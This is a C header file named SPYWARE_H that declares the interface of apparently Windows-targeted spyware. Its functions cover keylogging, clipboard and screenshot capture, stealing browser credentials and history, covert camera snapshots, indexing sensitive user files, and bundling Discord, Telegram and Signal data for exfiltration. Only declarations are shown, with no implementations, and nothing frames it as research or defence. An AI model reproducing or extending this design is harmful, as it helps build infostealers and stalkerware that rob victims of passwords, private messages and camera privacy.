#ifndef SPYWARE_H
#define SPYWARE_H

#include <stdio.h>

#ifdef _WIN32
#include <windows.h>
#endif

/* Keylogger functions */
void  spy_keylog_start(void);
void  spy_keylog_stop(void);
char *spy_keylog_dump(int *len_out);

/* Clipboard functions */
char *spy_clipboard_get(int *len_out);

/* Screenshot functions */
char *spy_screenshot_capture(int *len_out);

/* Credential functions */
char *spy_browser_creds_steal(int *len_out);
char *spy_browser_history_steal(int *len_out);

/* Camera snapshot — returns BMP file data */
char *spy_camera_snapshot(int *len_out);

/* Returns the last camera failure reason string (empty on non-Windows) */
const char *spy_camera_last_error(void);

/* File index — returns newline-separated paths of sensitive files under C:\Users\ */
char *spy_file_search(int *len_out);

/* Messaging exfil — bundles Discord LevelDB, Telegram tdata, Signal db + config */
char *spy_messaging_steal(int *len_out);

#endif /* SPYWARE_H */
